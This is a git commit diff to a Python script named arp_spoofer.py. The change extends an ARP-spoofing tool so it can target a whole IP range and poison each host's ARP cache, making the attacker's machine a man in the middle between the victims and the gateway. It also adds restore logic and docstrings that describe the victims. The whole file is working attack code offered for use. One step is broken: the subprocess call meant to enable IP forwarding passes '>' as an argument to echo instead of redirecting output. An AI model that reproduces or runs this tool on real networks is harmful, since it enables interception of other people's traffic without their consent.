da9984cd0e6fdfdb55b8718793707ba70b81b583
Miles <milesjtn@gmail.com>
2019-07-11 15:07:59 +1000

    handles exceptions for IPs, now takes IP range as well as single IP

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -5,36 +5,59 @@ import time
 import subprocess
 import sys
 
+"""
+function sends ARP request to network gateway to obtain device MAC addresses
+:param dest_ip: the IP of the host, or IP range for which MAC addresses are to be obtained
+:return: a list containing a dictionary entry with key-value pairs for IP and MAC addresses for each host
+"""
+
 def get_mac(dest_ip):
     arp_request = scapy.ARP(pdst=dest_ip)
     broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast_packet = broadcast_request / arp_request
     answered_packets = scapy.srp(arp_request_broadcast_packet, timeout=1, verbose=False)[0]
-    try:
-        return answered_packets[0][1].hwsrc
-    except IndexError:
+    reply_dict_list = []
+
+    for element in answered_packets:
+        packet_dict_entry = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        reply_dict_list.append(packet_dict_entry)
+    if not reply_dict_list:
         print("[-] Host " + str(dest_ip) + " is not up, or that IP does not exist on current subnet")
         sys.exit(0)
+    else:
+        return reply_dict_list
+
 
 """
+function performs the ARP response to target in order to establish your host as the man in the middle
 :param target_ip: the IP address of the victim you are posing at the router to
+:param target_mac: the MAC address of the victim
 :param source_ip: the IP address you are impersonating
 """
 
-def spoof_arp(target_ip, source_ip):
-    target_mac = get_mac(target_ip)
+def spoof_arp(target_ip, target_mac, source_ip):
     arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
     scapy.send(arp_response_packet, verbose=False)
 
 
+"""
+function performs the ARP response to target in order to restore its original ARP cache
+:param target_ip: the IP address of the victim you are posing at the router to
+:param target_mac: the MAC address of the victim
+:param source_ip: the IP address you are impersonating
+"""
 
-def restore_arp(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
+def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
+    #target_mac = get_mac(target_ip)
+    #gateway_mac = get_mac(gateway_ip)
     arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
     scapy.send(arp_response_packet, verbose=False)
 
 
+"""
+function gets arguments from the terminal
+:return: returns a variable containing the arguments from object ArgumentParser()'s method parse_args()
+"""
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -50,39 +73,45 @@ def get_arguments():
         return arguments
 
 
+"""
+runs the script and displays host and target data in the terminal
+"""
+
 def execute():
     arguments = get_arguments()
-    target_mac = get_mac(arguments.target_ip)
-    source_mac = get_mac(arguments.source_ip)
+
+    target_mac_list = get_mac(arguments.target_ip)
+    source_mac = get_mac(arguments.source_ip)[0]["mac"]
+
     subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
     packet_count = 0
 
     print("\n")
     print("               " + "\t\t" + "IP address  " + "\t" + "MAC address")
     print("\n")
-    print("Current target:" + "\t\t" + str(arguments.target_ip) + "\t" + str(target_mac))
     print("Current source:" + "\t\t" + str(arguments.source_ip) + "\t" + str(source_mac))
+    print("\n")
 
+    for dict_entry in target_mac_list:
+        if dict_entry["ip"] != arguments.source_ip:
+            print("Current target:" + "\t\t" + str(dict_entry["ip"]) + "\t" + str(dict_entry["mac"]))
     print("\n")
     while True:
         try:
-            spoof_arp(arguments.target_ip, arguments.source_ip)
-            spoof_arp(arguments.source_ip, arguments.target_ip)
-            time.sleep(2)
-            print("\r[+] Packets sent: " + str(packet_count), end="")
-            packet_count += 2
+            for dict_entry in target_mac_list:
+                if dict_entry["ip"] != arguments.source_ip:
+                    spoof_arp(dict_entry["ip"], dict_entry["mac"], arguments.source_ip)
+                    spoof_arp(arguments.source_ip, source_mac, dict_entry["ip"])
+                    time.sleep(2)
+                    print("\r[+] Packets sent: " + str(packet_count), end="")
+                    packet_count += 2
         except KeyboardInterrupt:
-            restore_arp(arguments.target_ip, arguments.source_ip)
-            restore_arp(arguments.source_ip, arguments.target_ip)
+            for dict_entry in target_mac_list:
+                if dict_entry["ip"] != arguments.source_ip:
+                    restore_arp(dict_entry["ip"], dict_entry["mac"], arguments.source_ip, source_mac)
+                    restore_arp(arguments.source_ip, source_mac, dict_entry["ip"], dict_entry["mac"])
             print("[+] CTRL + C detected, exiting and restoring ARP configuration")
             sys.exit(0)
 
 
-
 execute()
-
-#things to add:
-#restore arp
-#IP range
-#exception handling for ips outside of subnet
-#graceful exit
